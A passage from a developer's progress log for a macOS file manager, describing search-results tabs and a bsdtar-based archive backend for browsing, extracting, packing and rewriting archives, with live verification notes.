`FileEntry`, caps at 5 000 with a truncation flag) + `SearchController` (the ⌥F7 sheet — name/
content fields, kind/size/date popups, a This-Folder/Everywhere scope, Find disabled until the
query asks for something) + `PanelViewController+Search` (runs the search, then installs the hits
as a **new virtual tab**: a `DirectoryListing` on the `.search` backend whose entries carry their
real `.local` paths, `hasLoaded=true`, `showHidden=true` so no dotfile hit is silently filtered).
`CommandBinding`/`MainMenuBuilder` wire `findFiles` into the Go menu after Go Up. The virtual pane
is recognized by a one-line `isSearchResults` (`panel.path.backend == .search`) and every
directory-bound behavior guards on it: no FSEvents watch, no re-list on tab-activate/both-panes-
refresh, no `..` row (`parentRowCount` requires `.local`), and New Folder/rename/multi-rename/
trash/delete/paste/Go-Up all disabled (in `validateMenuItem` *and* their action entry points, since
the keyboard paths bypass menu validation) — while **Copy/Move to the other pane stay enabled** (TC's
F5 on results: each target's real path copies fine). The path bar renders a non-clickable
"🔍 Results for …" for a `.search` path; Cmd+L bases at Home; and opening a *real* folder from a
result resets the tab's back/forward trail (`navigate` captures `wasVirtual` up front) so the
un-listable synthetic path never lands in history. Two SwiftLint limits tripped and were fixed the
usual way (extract a helper): `validateMenuItem` cyclomatic-complexity split a `validateMutatingItem`
helper out, `CommandCatalog` enum body moved Window+Application to an extension, `PathBarView` body
moved the virtual-label builder to an extension. Repo swiftformat/swiftlint-strict clean (one
pre-existing `redundantSelf` nit in the untouched `BrowserWindowController`); app `xcodebuild build`
+ `swift test` + app smoke test green. VERIFIED LIVE (mouse+menu-driven, no overlay; fully quit the
stale instance first per the recurring gotcha, and confirmed the fresh debug dylib carried the new
strings): Go ▸ **Find Files… ⌥F7** opened the sheet (Find greyed until "network-usage-2026-05" was
typed, then blue); Find opened a new left-pane tab **"network-usage-2026-05"** with path bar
**🔍 Results for "network-usage-2026-05"**, the **3** matching JSONs (byte-exact against the 3 in
the right Downloads pane), **3 items** status, and **no `..` row**; the File menu showed **Copy/Move
to Other Panel enabled** while **Rename/Multi-Rename/New Folder/Trash/Delete were all greyed**; and
closing the results tab (its ✕) restored the browsing `oleg` tab (breadcrumbs + `..` + 18 items, tab
bar re-hidden). Left the app on Home. GOTCHA (design): a virtual panel is the cleanest place the VFS
`.search` backend id + a per-site `isSearchResults` guard pays off — the alternative (a per-tab
`backend`) would have been a much larger refactor. NEXT M4: ArchiveBackend (libarchive — the
C-module/vendored-headers gate), saved searches in the places strip, the deferred search niceties
(tag chip, content-grep fallback for non-indexed volumes).

Progress (2026-07-10, M4 pass 4): the **ArchiveBackend — read-only archive browsing** landed —
TC's "open a zip and browse it like a folder", the headline "cash in the VFS abstraction" M4 item
and the first backend beyond `.local` that serves a *navigable* virtual tree (the `.search` pane
was a static snapshot). Taken **via `bsdtar`, not the libarchive C-API** (user's call): the macOS
SDK ships `libarchive.tbd` but no `archive.h`, so the C-module/vendored-headers gate stays deferred
— shelling out to `/usr/bin/bsdtar` (which *is* libarchive) needs zero infra and matches the app's
`Process`-spawning rhythm (`SpotlightSearchRunner`, `DirectoryLoader`). This pass is **browse-only**;
extraction (Quick Look inside, F5 copy-out) and packing are the next pass, because `CopyEngine.run`
takes one backend for source *and* dest — a cross-backend archive→local copy is its own chunk.

- **Core (pure, tested).** `DirnexCore/…/VFS/ArchiveTOC.swift` + `ArchiveTOCParser.swift` = a hermetic
  parser turning the `ls -l`-style table `bsdtar -tvf` prints into a navigable tree: `children(inDirectory:)`
  / `isDirectory(atInnerPath:)` / `entry(atInnerPath:)`. It handles every real-output quirk (validated
  against `/usr/bin/bsdtar` before wiring, like the mdfind predicates): the 8 fixed leading columns
  then a **verbatim** name (so "a file with spaces.txt" survives a would-be whitespace split), `d`/`l`/`-`
  mode → kind, `link -> target` symlink split, tar's leading `./` stripped (and the bare `./` root line
  dropped), and **intermediate directories synthesized** when the archive lists only `docs/api/readme.md`.
  Dates parse best-effort in `en_US_POSIX` (`MMM d HH:mm` / `MMM d yyyy`) — deterministic, not
  system-locale-dependent. `ArchiveBackend.swift` = a read-only `VFSBackend` answering `list`/`stat`
  purely from an in-memory TOC (`capabilities == .read`; writes stay at their `.unsupported` defaults);
  its `id` encodes the archive's on-disk path (`VFSBackendID.archive(forArchiveAt:)` → `archive:/…/pkg.zip`)
  so a `VFSPath` identifies both *which* archive and *which* inner entry. `ArchiveType.isBrowsable`
  (pure suffix match: zip/jar/cbz/7z/tar/tgz/tar.gz/tbz/tar.bz2/txz/tar.xz/tar.zst) decides Enter = browse
  vs. launch. +25 tests (`ArchiveTOCTests` 12, `ArchiveBackendTests` 9, `ArchiveTypeTests` 2, +2 in
  those covering the id round-trip) → **294 core tests**, all green, swiftformat/swiftlint-strict clean.
- **App (I/O boundary + wiring).** `Dirnex/Browser/CompositeBackend.swift` — a `VFSBackend` that routes
  each `VFSPath` by `path.backend`: `.local` → the real `LocalBackend`, an `archive:…` id → a lazily
  mounted `ArchiveBackend` (spawns `bsdtar -tvf` off-main via the co-located `ArchiveMounter`, parses,
  caches under an `NSLock`). **Composing** rather than swapping the pane's backend keeps *every* existing
  `self.backend` call site — listing, stat, sizing, copy/move, the shared queue and undo — working
  unchanged; only the routing is new. `BrowserWindowController` now builds `CompositeBackend(local:
  LocalBackend())` and hands it to both panes + the queue + undo. `volumeIdentifier` never mounts (the
  queue calls it per-source and it must stay cheap). Navigation: `openCurrentEntry` enters a browsable
  local archive file (→ `archive:…` root) instead of launching it; a new `PanelViewController+Archive.swift`
  adds `isArchive` / `isVirtualDirectory` and `goUpWithinArchive` (walk the inner tree, and at the archive
  root **exit to the containing folder landing the cursor on the archive file**); the `..` row now shows at
  every archive level; the path bar renders a non-clickable **"📦  pkg.zip  ▸  docs  ▸  api"** trail
  (`rebuildArchiveLabel`, factored beside the search label). **Capability degradation** reuses the
  search-pane pattern, generalized: `!isSearchResults` mutation guards became `!isVirtualDirectory`
  (covers search *and* archive) at both `validateMenuItem` *and* every action entry point (New Folder /
  rename / multi-rename / trash / delete / paste), while F5/F6 copy-out and ⌘C are gated on `!isArchive`
  (search still allows them; an archive member has no local URL yet); Quick Look, the ⌃Q Quick View, drag-out,
  and drop-target all guard on `entry.path.backend == .local`. One SwiftLint `type_body_length` on
  `PathBarView` (the recurring gotcha) fixed by moving the location-dispatch into the existing extension.
  Whole repo swiftformat/swiftlint-strict clean; app `xcodebuild build` + `swift test` green.
- **Verified live via computer-use** (mouse-driven, no overlay; fresh build confirmed in the debug
  **dylib** — `bsdtar`/`CompositeBackend`/"read the archive" strings present — since a stale `open`
  wouldn't carry it): double-clicking `pkg.zip` turned the pane into **📦 pkg.zip** listing `docs`/`images`
  (folders, dash size) + `alpha.txt` 14 B + `release notes.txt` 13 B (**space preserved**), a `..` row, and
  "4 items" (`..` excluded); into `docs` → `api` + `readme.md` 16 B; into `docs/api` → `reference.md` 17 B,
  path bar **📦 pkg.zip ▸ docs ▸ api**; the File menu there showed **Copy/Move to Other Panel, Rename,
  Multi-Rename, New Folder, Move to Trash, Delete Immediately ALL greyed** (only New Tab/Close Tab live);
  `..` walked `api → docs → root` each landing the cursor on the branch we came from, and one more `..` at
  the root **exited to `~/DirnexArchiveTest` with clickable local breadcrumbs restored and the cursor on
  `pkg.zip`**; `bundle.tgz` browsed identically (tar's `./` prefix stripped, no phantom root entry). GOTCHA
  (cosmetic, expected): `bsdtar`'s recent-file column has no year (`Jul 10 16:39`), so the `MMM d HH:mm`
  parse yields year **2000** — the time is right, the year is a placeholder; a real fix would infer the
  year, deferred. GOTCHA (architecture): a `CompositeBackend` that dispatches on `path.backend` is the
  clean way to browse a second backend without touching every `self.backend` site — the alternative
  (a per-tab backend) is a much larger refactor. NEXT M4: archive **extraction** (Quick Look inside + F5
  copy-out via a temp-extract-then-normal-copy path, since `CopyEngine` is single-backend) and **packing**;
  then archive **writes** (add/delete), saved searches in the places strip, deferred search niceties.

Progress (2026-07-10, M4 pass 5): **archive F5 copy-out** landed — TC's "open a zip and fish two files
out" (the M4 exit criterion), the first half of the extraction pass. The archive backend stays read-only;
this cashes the browse-only pass in for real *extraction*. The clean insight: `CopyEngine` takes one
backend for source *and* dest, so an archive→local copy can't go straight through it — instead the marked
members are **extracted to a temp directory with `bsdtar`, then handed to the normal copy queue** as real
local files, reusing every bit of its conflict / progress / undo machinery for free.

- **Core (pure, tested).** `DirnexCore/…/VFS/ArchiveExtraction.swift` = the pure argv half, mirroring
  `SpotlightQuery`/`ArchiveExtraction` split: `extractionArguments(archiveOnDiskPath:innerPaths:destinationDirectory:)`
  builds `bsdtar -x -f <archive> -C <dest> <member>…` where each member is the VFS inner path with its
  leading slash dropped, and `extractedLocation(ofInnerPath:inDirectory:)` reports where each member lands
  (`bsdtar` rebuilds the *full* inner path, so `/docs/api/x.md` → `<dest>/docs/api/x.md`). Members are
  **glob-escaped** (`\ * ? [`) because `bsdtar` treats each member as a shell-glob pattern — a name like
  `weird[1].txt` would otherwise read as a char-class and go unmatched (escaping the opening `[` alone is
  enough — validated live against bsdtar 3.5.3 / libarchive 3.7.4, along with: nested-file / dir-recursive /
  space-in-name / `./`-prefixed-tar / multi-member / missing-member extraction). +7 `ArchiveExtractionTests`
  → **301 core tests**, swiftformat/swiftlint-strict clean.
- **App (I/O boundary + wiring).** `Dirnex/Browser/ArchiveExtractor.swift` (mirrors `ArchiveMounter`) spawns
  `bsdtar` off-main into a fresh UUID temp dir under `NSTemporaryDirectory()/DirnexExtract/`, best-effort
  (a missing member exits non-zero but the rest still land; throws only when *nothing* landed).
  `PanelViewController+ArchiveExtract.swift`'s `beginArchiveExtraction()` extracts the marked/cursor members,
  `stat`s each extracted file back into a **local** `FileEntry` (dropping any that didn't land), then calls
  the existing `submitTransfer(kind:.copy…)` to the other pane. `CopyEngine` names the dest by `entry.name`
  (its own last component), so a deep temp source `<tmp>/docs/api/x.md` lands **flat** as `x.md` — no
  strip-components needed. F5 routes here (`copyToOtherPane` → `if isArchive { beginArchiveExtraction() }`);
  `validateMenuItem` splits the old joint Copy/Move case so **Copy is enabled from an archive but Move stays
  gated** (`!isArchive`) — a read-only archive has no source to remove, so there's no move-out. Temp dirs are
  purged at launch (`ArchiveExtractor.purgeTemporaries()` in `AppDelegate` — race-free, nothing's extracting
  yet; the copy queue *copies* the temps so they're dead weight once queued, and the current session's are
  reclaimed next launch or by the OS). ⌘C-to-clipboard and drag-out from an archive stay gated this pass.
- **Verified live via computer-use** (fresh build, `DirnexExtract`/`beginArchiveExtraction` strings confirmed
  in the debug **dylib**; fully quit the stale instance first): inside `pkg.zip`, marked `docs` (a dir) +
  `a file with spaces.txt`, F5 → both landed in the other pane; on disk the tree was byte-exact and recursive
  (`docs/readme.md`=readme, `docs/api/reference.md`=reference, the space preserved, `images` correctly NOT
  extracted). Re-F5 of `a file with spaces.txt` raised the **rich per-file conflict dialog** (Replace / Keep
  Both / Skip / Replace-If-Newer, "apply to all", queue bar) — proving it flows through the normal queue —
  and Keep Both produced `a file with spaces copy.txt`. A nested `docs/api/reference.md` F5'd from inside the
  subfolder landed **flat** as `reference.md` (the `entry.name` behavior). The File menu inside the archive
  showed **Copy to Other Panel enabled, Move + all mutations greyed**. Launch-purge confirmed: 3 temp dirs
  accumulated, survived quit, and were gone after relaunch. GOTCHA (bsdtar): members are glob *patterns*, not
  literals — must escape `\ * ? [`, and `extractedLocation` uses the *raw* (unescaped) name since the on-disk
  file keeps its real name. GOTCHA (architecture): temp-extract-then-normal-copy is the clean cross-backend
  path — the source `FileEntry`s just point at the extracted temp files, and `CopyEngine`'s name-by-last-
  component does the rest, so no `CopyEngine` refactor was needed. NEXT M4: archive **Quick Look inside** (the
  extraction pass's other half — extract-on-demand + cache the single cursor member, then relax the
  `.local`-only guards in `+QuickLook`/`+QuickView`) and **packing** (F5-with-archive-target via `ditto`/
  `bsdtar`); then archive **writes**, saved searches in the places strip, deferred search niceties.

Progress (2026-07-10, M4 pass 6): **archive Quick Look / Quick View inside** landed — the extraction
pass's other half. Both preview surfaces (⌘Y floating Quick Look and ⌃Q embedded Quick View) now show
the file under the cursor when it's an archive *member*, by extracting that single member on demand and
pointing the preview at the extracted temp file. Pure app-layer wiring on top of pass 5's plumbing — no
new core logic (the `bsdtar` argv is already `ArchiveExtraction`, already tested), so **core stays at 301
tests** and this pass adds none.
- **The cache.** NEW `Dirnex/Browser/ArchivePreviewCache.swift` (`@MainActor final class`, one per window,
  owned by `BrowserWindowController`, reached through the `PanelHost.archivePreviewCache` protocol getter):
  a `[ArchiveMember: URL]` dict keyed by `(archiveOnDiskPath, innerPath)`. `cachedURL(for:)` is the
  synchronous lookup the preview surfaces read; `extractedURL(for:)` extracts off-main via the *existing*
  `ArchiveExtractor.extract(innerPaths:[one])` (single member → one landed file) and memoizes. Chose a dict
  over a literal single slot (the plan sketch said "single cursor member") because it kills the
  async-completion race — a slow extraction that finishes *after* the cursor has moved on writes its own
  key instead of evicting the member now under the cursor, so no preview ever blanks from a stale result;
  arrowing back is also instant. The cache never deletes: extracted files pile up under `ArchiveExtractor`'s
  `DirnexExtract/<uuid>/` root (nested members keep their full inner path, e.g. `<uuid>/docs/api.md`) and
  are purged at launch exactly like F5's, so nothing races an in-flight preview.
- **On-demand trigger.** NEW `Dirnex/Browser/PanelViewController+ArchivePreview.swift`: `previewableArchiveMember`
  (nil unless browsing an archive AND the cursor is on a *file* member — not `..`, not a directory) and
  `prepareArchivePreview(onReady:)` — a no-op that never calls back when the member is absent OR already
  cached (so a caller can invoke it after every refresh without looping), else it extracts and calls
  `onReady` on the main actor *only if the cursor is still on that same member*. That "still-current" guard
  is what makes the single async path safe under rapid arrowing.
- **Relaxed guards.** `+QuickView.quickViewSourceURL` and `+QuickLook`'s new `quickLookURL(for:)` now resolve
  a `.local` entry to its real URL AND an archive member to `cachedURL(for:)` (nil until extraction lands).
  `quickLookItems()` gained an `isArchive` branch: inside an archive it previews just the cursor member once
  cached (the marked-set preview stays a local-files feature). Drivers: `refreshQuickLookIfVisible()` and the
  ⌘Y-open path (`fileTableToggleQuickLook`) both call `prepareArchivePreview { refreshQuickLookIfVisible() }`;
  `BrowserWindowController` folds `panelCursorDidChange`/`updateQuickView` into one `showActivePreview(from:)`
  that shows the (possibly-nil) cached URL at once then `prepareArchivePreview { … showQuickViewPreview … }`
  re-drives the inactive pane when the member lands (guarded on Quick View still on + same active pane). QL/QV
  menu items were already always-enabled (`default: return true`), so nothing to ungate.
- **Verified live via computer-use** (fresh Debug build after a full quit; `ArchivePreviewCache` confirmed in
  the dylib): entered `bundle.zip`, ⌘Y on `readme.txt` → floating Quick Look showed its text; ⌘Y on the
  6.6 MB `photo.heic` → showed the full image ("Open with Preview"); ⌃Q → inactive pane live-previewed the
  cursor member and *tracked the cursor* (arrow onto `photo.heic` swapped the preview to the image); cursor on
  the `docs` directory → blank preview (correctly unpreviewable); entered `docs`, `api.md` previewed its
  markdown (nested inner path). The three `DirnexExtract/<uuid>/` temps on disk afterwards were exactly
  `readme.txt`, `photo.heic`, and `docs/api.md` — proving per-member on-demand extraction + the full-inner-path
  rebuild. GOTCHA (minor): with the shared Quick Look panel key, arrow keys navigate *preview items* (only 1
  for an archive), not the underlying table — so changing the previewed member with ⌘Y open means closing +
  reselecting; ⌃Q (table stays first responder) tracks the cursor live as expected. NEXT M4: archive **packing**
  (F5-with-archive-target via `ditto`/`bsdtar`), then archive **writes**, saved searches in the places strip,
  deferred search niceties.

Progress (2026-07-10, M4 pass 7): **archive packing** landed — TC's Pack (⌥F5), the inverse of F5 copy-out
and the last half of the "open a zip, fish two files out, repack" exit criterion. Select real local files in
one pane, ⌥F5, pick a name + container format, and a new archive is created in the *other* pane — the same
default destination as F5. Taken via `bsdtar -a -c` (not `ditto`), which handles zip/tar.gz/tar.bz2/7z/tar
**uniformly** with the format inferred from the archive's own suffix, matching the browse/extract passes'
`bsdtar` rhythm.
- **Core (pure, tested).** `DirnexCore/…/VFS/ArchivePacking.swift` = the pure argv half, mirroring
  `ArchiveExtraction`: `packingArguments(archiveOnDiskPath:sourceDirectory:sourceNames:)` builds
  `bsdtar -a -c -f <archive> -C <sourceDir> <name>…` — `-a` infers the format from the suffix, `-c` creates
  (overwriting; the app resolves that collision first), and `-C` + bare names make the entries archive-relative
  (so the archive holds `docs/…`, not an absolute path). Every selected item shares one parent — the pane's
  current directory — so a single `-C` covers them all. Unlike extraction, create-side arguments are **literal
  file paths, not glob patterns** (validated live against bsdtar 3.5.3), so **no member escaping** is needed —
  a name like `weird[1].txt` is passed verbatim. A `Format` enum (`.zip/.tarGz/.tarBz2/.sevenZip/.tar`, each
  with `suffix` + `displayName`, `.zip` first) drives the dialog's popup and guarantees every packable format
  round-trips back into a browsable one (`ArchiveType.isBrowsable`). `defaultBaseName(forSourceNames:
  sourceDirectoryName:)` = a single source's name minus its extension (`report.pdf`→`report`, the folder
  `docs`→`docs`), else the source directory's own name (multi-item→`<folder>`), falling back to `Archive` at a
  volume root; `archiveFileName(baseName:format:)` appends the suffix without doubling an already-present one
  (`docs.zip`+Zip→`docs.zip`, not `docs.zip.zip`). +11 `ArchivePackingTests` + 1 `CommandCatalogTests` →
  **313 core tests**, swiftformat/swiftlint-strict clean.
- **App (I/O boundary + wiring).** `Dirnex/Browser/ArchivePacker.swift` (mirrors `ArchiveExtractor`/
  `ArchiveMounter`) spawns `bsdtar` off-main; unlike extraction it writes **directly to the destination** (the
  result *is* a user file, nothing to temp/purge) and cleans up a partial archive on a non-zero exit or missing
  output. `PanelViewController+ArchivePack.swift`'s `beginArchivePacking()` guards `canPackFromHere`
  (`.local && !isVirtualDirectory` — can't pack *from* an archive or a search-results pane, and every item must
  share one parent), requires the other pane be a real writable folder, then raises a small sheet (NSAlert
  accessory: a name field over a format popup) pre-filled from the core default. `confirmAndPack` `stat`s the
  target first — `bsdtar -c` would silently overwrite — and raises a Replace/Cancel confirmation on a collision;
  `runPack` spawns off-main then `refreshCurrentDirectory(selecting:)` re-lists the destination pane with the
  new archive landed under the cursor. Registry wiring: `file.pack` command (title "Pack…", ⌥F5, keywords
  compress/archive/zip/tar) in `CommandCatalog`, selector in `CommandBinding`, `.command("file.pack")` in
  `MainMenuBuilder`'s File layout (grouped with Copy/Move), and a `validateArchiveItem` helper split out of
  `validateMenuItem` (the recurring cyclomatic-complexity gotcha) enabling it only from a real local selection
  with a counterpart pane. App `xcodebuild build` + full `swift test` green.
- **Verified live via computer-use** (fresh Debug build after a full quit; `ArchivePacker`/`beginArchivePacking`/
  `file.pack` confirmed in the debug **dylib**): File menu showed **Pack… ⌥F5** enabled, grouped after Copy/Move.
  Marked 4 items (a dir + a spaced name + `weird[1].txt` + a plain file) → Pack sheet titled "Pack 4 items",
  name pre-filled **"left"** (source dir name), format popup listing all five with Zip first. Zip → `left.zip`
  landed **selected** in the other pane; on disk byte-exact and recursive (`photos/` + both jpgs, `alpha.txt`,
  `release notes.txt` space preserved, `weird[1].txt` glob-metachar preserved literally). Double-clicking it
  browsed straight back in (**📦 left.zip** breadcrumb, 4 items) — the full pack↔browse round-trip. Re-packing
  "left" raised the **"left.zip" already exists** Replace/Cancel confirmation; Replace re-created a valid
  archive. A single-file pack of `alpha.txt` titled "Pack "alpha.txt"", defaulted the name to **"alpha"**
  (extension stripped), and Tarball (gzip) produced a real gzip `alpha.tar.gz` containing `alpha.txt` — proving
  `bsdtar -a`'s suffix-driven format inference through the app path. GOTCHA (bsdtar): create-side arguments are
  **literal paths, not globs** (the opposite of extract/list members), so packing needs no escaping while
  extraction does. GOTCHA (architecture): packing is *not* a `CopyEngine` job (that's one backend for src+dest);
  it writes the archive directly, so it's its own `ArchivePacker` path with its own overwrite guard, mirroring
  how extraction went temp-extract-then-copy. NEXT M4: archive **writes** (add/delete inside a zip via
  rewrite-to-temp), nested archives, saved searches in the places strip, deferred search niceties.

Progress (2026-07-11, M4 pass 8): **archive delete inside (F8)** landed — the first half of "Archive
writes: add/delete inside zip", the last big ArchiveBackend gesture. Mark members inside a browsed
archive, F8 (or Shift+F8, or ⌘⌦), confirm, and they're removed from the archive on disk — a whole
directory drops its subtree, a glob-metachar name (`weird[1].txt`) or a spaced name (`release
notes.txt`) deletes exactly, and the pane re-lists the rewritten archive in place. The archive stays
`bsdtar`-driven (no libarchive C-module).
- **Why extract-and-repack, not `bsdtar --exclude @archive` (the design crux, validated live against
  bsdtar 3.5.3 / libarchive 3.7.4).** The obvious "re-stream the archive minus some members" trick
  can't delete an *exact* path: libarchive matches an exclude pattern against any **trailing subpath**
  and offers no anchoring — deleting `docs/api/x.md` *also* silently drops `outer/docs/api/x.md`, and a
  bare root `readme.txt` hits `readme.txt` at every depth (a leading `./` or `/` doesn't anchor; a
  leading `/` matches nothing). So the archive is instead **extracted whole** into a scratch dir, the
  targets removed there by their **real filesystem paths** (exact — a plain `removeItem`, zero glob
  ambiguity), and the surviving tree **repacked** into a fresh archive that **atomically replaces** the
  original. Costs a disk round-trip, but it's correct for every format uniformly and — the plan's
  "journal-safe temp file" — never touches the original until the repack fully succeeds.
- **Core (pure, tested).** `DirnexCore/…/VFS/ArchiveMutation.swift` = the pure argv half, mirroring
  `ArchiveExtraction`/`ArchivePacking`: `extractAllArguments` (`-x -f <arc> -C <work>`, no member list →
  everything out), `repackAllArguments` (`-a -c … -f <new> -C <work> .` — packs `.` so a delete-all
  still repacks a valid *empty* archive rather than failing on an empty arg list), `workingLocation`
  (the exact extracted on-disk path of an inner member — unescaped, since deletion is by literal path),
  and `temporaryArchiveName(forArchiveNamed:token:)` (a hidden `.dirnex-rewrite-<uuid>-<name>` sibling
  that keeps the original's **full** suffix so `bsdtar -a` re-infers the same container). GOTCHA
  (bsdtar `-a` format inference): `-a` reads `.zip`/`.7z`/`.tar`/`.tgz`/`.tar.*`/`.tbz*`/`.txz`/
  `.tar.zst` right but treats the zip-family aliases **`.jar`/`.cbz` as tar** — which would corrupt
  them on repack — so `formatOverrideArguments` adds an explicit `--format zip` for those (verified
  live). +5 `ArchiveMutationTests` → **318 core tests**, swiftformat/swiftlint-strict clean.
- **App (I/O boundary + wiring).** `Dirnex/Browser/ArchiveWriter.swift` (mirrors `ArchivePacker`/
  `ArchiveExtractor`) spawns the two `bsdtar` runs off-main into a `DirnexArchiveWrite/<uuid>/` scratch
  dir (`defer`-cleaned), repacks into the hidden sibling **in the archive's own directory** (same volume
  → the swap is atomic), then `FileManager.replaceItemAt` swaps it over the original and cleans a partial
  on any failure — the original is untouched unless the whole rewrite succeeds. `PanelViewController+
  ArchiveWrite.swift`'s `beginArchiveDelete()` gathers the marked/cursor members, raises a **critical**
  confirm ("Delete N items from “pkg.zip”? This rewrites the archive and can’t be undone."), runs the
  rewrite, then `(backend as? CompositeBackend)?.invalidateMountedArchive(at:)` drops the stale TOC and
  `refreshArchiveDirectory()` re-lists the current inner dir in place (its own archive-aware re-list,
  since the local-only `refreshCurrentDirectory` skips virtual panes; retreats to the archive root if the
  inner dir itself was deleted). Wiring: `CompositeBackend.invalidateMountedArchive(at:)` (new); F8/⇧F8/
  ⌘⌦ route via `deleteSelection` → `if isArchive { beginArchiveDelete() }` (before the `!isVirtualDirectory`
  guard); `validateMutatingItem` enables both delete items inside an archive (`isArchive` → non-empty
  selection); `AppDelegate` adds `ArchiveWriter.purgeTemporaries()` beside the extractor's. Archive delete
  is **not undoable** (a rewrite, like a permanent delete) — the confirm says so; nothing is journaled.
  App `xcodebuild build` green, new methods confirmed in the debug **dylib**.
- **Verified live via computer-use** (fresh Debug build after a full quit): File menu inside an archive
  showed **Move to Trash / Delete Immediately… enabled** with Move/Pack/Rename/Multi-Rename/New Folder
  still greyed. In `pkg.zip` marked a dir (`docs`) + a spaced name + `weird[1].txt` → "Delete 3 items
  from “pkg.zip”?" → on-disk the three gone, `images`/`alpha.txt`/`readme.txt` byte-exact, archive VALID,
  **zero `.dirnex-rewrite-*` litter**, scratch dir cleaned. The **over-match safety case** (`dup.zip` with
  `a/notes.txt` AND `b/notes.txt`): deleting `a/notes.txt` (⌘⌦, single-item confirm) left `b/notes.txt`
  intact with content "B" — the exact case `--exclude` would have corrupted. Delete-all (mark `a`+`b` at
  root) → a valid **empty** archive that still browses (0 items + `..`). NEXT M4: archive **add-into**
  (paste / F5 / F6 *into* an archive pane — the extract-repack engine is symmetric), nested archives,
  saved searches in the places strip, deferred search niceties.

Progress (2026-07-11, M4 pass 9): **archive add-into (paste ⌘V / F5 / F6)** landed — the *second*
half of "Archive writes: add/delete inside zip" (**that M4 line now `[x]`**), the symmetric inverse
of pass 8's delete. Drop local files/folders onto a browsed archive pane and they're written into the
archive on disk, at whatever inner directory the pane is showing; a same-named member is a *replace*
(confirmed first); F6 additionally trashes the local originals. The archive stays `bsdtar`-driven (no
libarchive C-module).
- **Symmetric with delete — one rewrite, two edits.** Add and delete are the *same* extract-whole →
  edit-the-scratch-tree → repack → atomic-swap flow (see pass 8 for why an in-place `bsdtar`
  streaming edit can't target an exact path); only the edit differs. `ArchiveWriter` was refactored so
  both go through one private `rewrite(archiveOnDiskPath:edit:)` that owns the scratch dir, the
  extract-all, the repack into a hidden `.dirnex-rewrite-<uuid>-<name>` sibling, and the
  `FileManager.replaceItemAt` swap (journal-safe: the original is untouched until the repack fully
  succeeds). `delete`'s edit `removeItem`s members by `workingLocation`; the new `add`'s edit
  `copyItem`s each source into `additionDirectory` (the inner dir mapped into the scratch tree),
  replacing a same-named member first (so `copyItem` never fails on an existing dest).
- **Core (pure, tested).** Two helpers added to `DirnexCore/…/VFS/ArchiveMutation.swift` (whose doc now
  covers add *and* delete): `additionDirectory(forInnerDirectory:inWorkingDirectory:)` (`/docs` →
  `<workDir>/docs`, archive root `/` → `<workDir>` itself — leading slash stripped like
  `workingLocation`, but the root case handled explicitly so it never appends an empty component) and
  `collidingNames(addingNames:existingNames:)` (the added names that already exist, matched
  **case-insensitively** — the archive extracts onto case-insensitive APFS, so `README`/`readme`
  collide on disk regardless of the archive's own case sensitivity — preserving the added spelling +
  order so the confirm can list them). The extract/repack argv is reused verbatim from delete. +2
  `ArchiveMutationTests` → **320 core tests**, swiftformat/swiftlint-strict clean.
- **App (I/O + wiring).** `ArchiveWriter.add(localPaths:toInnerDirectory:ofArchiveAt:)` runs the shared
  rewrite off-main. NEW `PanelViewController+ArchiveAdd.swift`: `beginArchiveAdd(localSources:kind:
  from:)` (on the *destination* archive pane) lists the dest inner dir off-main for its real member
  names, computes collisions, raises a **Replace/Cancel** warning only if any exist (a clean add needs
  no confirm — matching how a local paste "just works"; the pack flow's precedent), then `runArchiveAdd`
  invalidates the stale mount (`CompositeBackend.invalidateMountedArchive`) + `refreshArchiveDirectory`
  re-lists in place. `pasteIntoArchive()` stats the pasteboard URLs into local sources and funnels in;
  `removeArchiveMoveOriginals(_:)` (on the *source* pane) trashes the F6 originals afterward + journals
  `UndoRecord.trash` — so the move's local half is undoable even though the archive rewrite isn't.
  Entry points route in `PanelViewController+Copy` (F5/F6 → `archiveDestinationPane()` when the
  counterpart `isArchive`, `.copy`/`.move`), `PanelViewController+Clipboard` (⌘V → `pasteIntoArchive`
  when `isArchive`; ⌥⌘V move-paste into an archive is left out this pass), and `validateMenuItem`
  (Paste enabled via `canWriteHere || isArchive`; Copy/Move-to-other-pane already allowed a local
  source + any counterpart). App `xcodebuild build` green, new methods confirmed in the debug **dylib**.
- **Verified live via computer-use** (fresh Debug build after a full quit; left pane = local `incoming/`,
  right pane browsing `box.zip`). **F5 clean multi-add** (`pics/`+`alpha.txt`+`beta.dat`, no collision,
  no confirm) → all three written byte-exact incl. the recursive `pics/one.png`, original `docs/guide.md`
  + `readme.txt` intact, re-listed in place, **zero `.dirnex-rewrite-*` litter**. **F5 collision**
  (`readme.txt`) → "Replace “readme.txt” in “box.zip”?" → Replace → archive `readme.txt` flipped to the
  new content, still one copy (no dup), `docs` intact. **⌘V paste** (`gamma.txt`) → added byte-exact.
  **F6 move** (`delta.txt`) → written into the archive AND the local original gone from `incoming/`
  (Trash), Edit menu showed **"Undo Move to Trash ⌘Z"**, and the undo restored `incoming/delta.txt`
  ("DELTA moved") while the archive kept its copy (rewrite not undoable, local trash half is). Scratch
  dir empty after each op. Fixtures deleted. NEXT M4: nested archives (browse/extract a zip inside a
  zip), saved searches as places-strip virtual folders, deferred search niceties (tag chip,
  content-grep fallback); archive drag-drop-in and ⌥⌘V move-paste-in are small follow-ons on this engine.

Progress (2026-07-12, M4 pass 10): **nested archives — browse/extract a zip inside a zip** landed —
the last open ArchiveBackend gesture (**that M4 line is now `[x]`**, so `ArchiveBackend` is complete).
Entering a browsable archive *member* while already inside an archive extracts that member to a temp
file (with `bsdtar`, via `ArchiveExtractor` — the same path as Quick Look inside and F5 copy-out) and
browses *that* file's virtual contents; "go up" walks back out to the enclosing archive's inner
directory (landing on the member), the breadcrumb spans the whole chain, and F5 copy-out works from
any depth. A nested mount is the extracted temp copy, so it's **read-only** this pass (writing back
through nesting is a later item), matching the app's capability-degradation pattern.
- **The crux — provenance, not a new backend id.** An inner archive has no on-disk path of its own,
  and the `archive:…` backend id encodes an *on-disk* path, so entering one first extracts the member
  to a temp file and mounts *that* path (the existing `CompositeBackend` lazily mounts it like any
  archive — no routing change). What's new is remembering where each temp mount came from, so "go up"
  returns to the *outer* archive's inner directory (onto the member) instead of dumping the user into
  the temp extraction dir, and the breadcrumb reads `outer.zip ▸ sub ▸ inner.zip ▸ …` rather than a
  bare temp name. A temp→origin(`VFSPath`) map chains for arbitrary depth (each step moves to a
  strictly-outer archive).
- **Core (pure, tested).** NEW `DirnexCore/…/VFS/NestedArchiveMap.swift` = a `Sendable` value type:
  `record(mount,origin)`, `origin(ofMountOnDiskPath:)` (the up-nav anchor + the nested-vs-top-level
